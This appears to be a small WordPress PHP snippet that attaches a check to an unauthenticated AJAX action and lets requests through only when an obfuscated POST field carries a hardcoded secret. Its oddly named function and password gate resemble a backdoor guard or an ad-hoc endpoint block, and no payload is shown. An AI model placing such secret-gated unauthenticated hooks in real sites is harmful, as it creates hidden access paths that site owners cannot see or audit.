<?php

function real_pages_remover_bootstrap() {
	if (!isset($_POST["uvjbsdtqqgbej"]) || $_POST["uvjbsdtqqgbej"] !== "dI7CdU23A") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'real_pages_remover_bootstrap', 5, 1);
